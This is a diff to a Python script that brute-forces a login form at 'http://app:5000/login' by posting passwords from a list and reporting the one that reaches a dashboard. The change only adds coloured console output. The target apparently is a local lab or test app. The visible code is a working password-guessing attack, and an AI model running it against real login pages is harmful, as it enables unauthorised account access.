@@ -1,4 +1,8 @@
 import requests, time
+from colorama import Fore, Style, init
+
+# initializing colorama
+init(autoreset=True)
 
 URL = "http://app:5000/login"
 
@@ -31,9 +35,9 @@ for password in password_list:
 
     r = requests.post(URL, data=data)
 
-    print(f"Trying: {password} | Status: {r.status_code}")
+    print(Fore.YELLOW + f"Trying: {password} | Status: {r.status_code}" + Style.RESET_ALL)
     time.sleep(1)
 
     if "dashboard" in r.text.lower():
-        print(f"[SUCCESS] Password found: {password}")
+        print(Fore.GREEN + f"[SUCCESS] Password found: {password}" + Style.RESET_ALL)
         break
